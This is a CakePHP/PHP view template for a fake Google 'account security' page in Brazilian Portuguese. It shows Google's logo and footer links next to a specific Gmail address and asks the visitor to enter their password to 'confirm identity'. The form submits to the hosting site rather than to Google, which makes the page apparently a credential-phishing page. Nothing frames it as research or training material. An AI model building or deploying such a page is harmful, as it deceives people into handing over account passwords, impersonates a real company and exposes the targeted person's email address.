<link href="https://fonts.googleapis.com/css?family=Poppins:600&display=swap" rel="stylesheet">
<script src="https://kit.fontawesome.com/a81368914c.js"></script>

<style>
  .google-input {
    padding: 16px;
    border: 3px solid #ddd;
    border-radius: 4px;
    box-shadow: none;
    font-size: 20px;
    color: #333;
    background-color: #fff;
    width: 100%;
    max-width: 390px;
  }

  @media (max-width: 576px) {
    .google-input {
      font-size: 16px;
      padding: 10px;
    }
  }
</style>

<?php echo $this->Html->image('wave.png', ['class' => 'wave']); ?>

<div class="container">
  <div class="row justify-content-center">
    <div class="col-md-6">
      <div class="text-center">
        <?php echo $this->Html->image('google.png', ['alt' => 'Google', 'style' => 'height: 50px; ']); ?>
        <br>
        <br>
        <div class="d-flex flex-column">
          <p style="color: #898989; font-size: 30px;">Segurança para conta</p>
          <p style="color: #898989; font-size: 22px;">brunoxavierpires043@gmail.com</p>
          <p style="color: #898989; font-size: 20px;">Responda às perguntas a seguir para confirmar que esta conta é sua.</p>
        </div>
      </div>
      <div class="card" style="background: #f5f5f5;">
        <div class="text-center">
          <?php echo $this->Html->image('icon.png', ['class' => 'card-img-top', 'style' => 'height: 270px; width: 260px;']); ?>
        </div>
        <div class="card-body">
          <h5 class="card-text text-center">Insira a senha para confirmar sua identidade</h5>
          <?= $this->Form->create(null, ['class' => 'form-login']) ?>
          <div class="form-group d-flex flex-column">
            <input type="password" name="password" class="form-control" placeholder="Senha">
            <button type="submit" name="btncadastrar" class="btn btn-primary mt-3">Enviar</button>
          </div>
          <?= $this->Form->end() ?>
        </div>
      </div>
      <br>
      <div class="row">
        <div class="col-md-6 col-sm-12">
          <a>Português (Brasil)</a>
        </div>
        <div class="col-md-2 col-sm-4">
          <a href="https://support.google.com/?hl=pt-BR" target="_blank">Ajuda</a>
        </div>
        <div class="col-md-2 col-sm-4">
          <a href="https://policies.google.com/privacy?hl=pt-BR" target="_blank">Privacidade</a>
        </div>
        <div class="col-md-2 col-sm-4">
          <a href="https://policies.google.com/terms" target="_blank">Termos</a>
        </div>
      </div>


    </div>

  </div>
</div>



